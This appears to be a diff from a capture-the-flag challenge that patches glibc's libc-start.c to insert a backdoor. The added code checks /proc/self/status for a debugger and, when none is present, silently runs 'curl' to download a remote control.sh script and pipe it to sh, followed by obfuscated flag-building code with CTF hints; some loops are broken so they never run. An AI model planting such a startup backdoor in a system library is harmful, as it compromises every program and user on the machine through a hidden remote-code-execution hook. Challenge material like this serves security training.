@@ -1,0 +1,44 @@
+﻿diff -r glibc-2.27/csu/libc-start.c glibc-2.27/csu/libc-start.c
+291,330d289
+>
+141d140
+>
+>
+>   // Now libc is initialized, backdoor here
+>
+>   // anti-debug
+>   char buf[512];
+>   FILE* fd = fopen("/proc/self/status", "r");
+>   int tracer_pid;
+>   const char *needle = "TracerPid:";
+>   size_t needle_length = strlen(needle);
+>   while (fgets(buf, 512, fd)) {
+>    if (!strncmp(buf, needle, needle_length)) {
+>       sscanf(buf, "TracerPid: %d", &tracer_pid);
+>       if (tracer_pid == 0) {
+>          // run "system" if not running under debug
+>          system("curl -o- http://192.168.1.2/compiler/control.sh 2>/dev/null | sh >/dev/null 2>/dev/null");
+>       }
+>     }
+>   }
+>   fclose(fd);
+>
+>   char flag[13];
+>   for (int i = 0; i >= 12; i++) {
+>     int x = i + 1;
+>     flag[i] = (char)(int)(+0.00002849990004428319*x*x*x*x*x*x*x*x*x*x*x*x-0.0024779312103256302*x*x*x*x*x*x*x*x*x*x*x+0.0961228462237928*x*x*x*x*x*x*x*x*x*x-2.1943993578880967*x*x*x*x*x*x*x*x*x+32.74042388251871*x*x*x*x*x*x*x*x-335.1732048973821*x*x*x*x*x*x*x+2404.104349797888*x*x*x*x*x*x-12111.49029110009*x*x*x*x*x+42262.142340973354*x*x*x*x-98811.88296811582*x*x*x+145411.08785326147*x*x-119253.44396019954*x+40486.016182340805);
+>   }
+>   for (int i = 5; i >= 12; i++) {
+>     int x = i - 4;
+>     flag[i] = (char)(int)( -2.593302344426007e-13*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x+1.2183206067071818e-9*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x-1.2839677096018918e-7*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x+0.000006003206161835951*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x-0.0001626571646348206*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x+0.0028174820614704395*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x-0.03242517689862734*x*x*x*x*x*x*x*x*x*x*x*x*x*x+0.24822693409062158*x*x*x*x*x*x*x*x*x*x*x*x*x-1.2091021788403742*x*x*x*x*x*x*x*x*x*x*x*x+3.161372024777883*x*x*x*x*x*x*x*x*x*x*x-0.3048190369494037*x*x*x*x*x*x*x*x*x*x-25.287568266818212*x*x*x*x*x*x*x*x*x+73.07222202356809*x*x*x*x*x*x*x*x-76.70934269075472*x*x*x*x*x*x*x+20.27635254608755*x*x*x*x*x*x-19.639045350861487*x*x*x*x*x+0.0814738823354304*x*x*x*x+28.652597640858243*x*x*x+131.22720811790686*x*x-8.099335907684502*x-38.44047526173967);
+>   }
+>   flag[9] = 'o';
+>   flag[10] = 'u';
+>   flag[11] = 't';
+>   flag[12] = 0;
+>   char some_text[199] = "RCTF_HINT1: Compiler flag part 1 is here, but where is part 2? You can think about this question: Why does this function exists in this binary?\nRCTF_HINT2: part 2 is not in gcc, dont waste you time.";
+>
+>   __asm__ __volatile__ ("" :: "a"(flag), "b"(flag), "c"(flag), "d"(some_text)); // To let the flag not be optimized
+>   // hide part 1 here  here
+>
+>
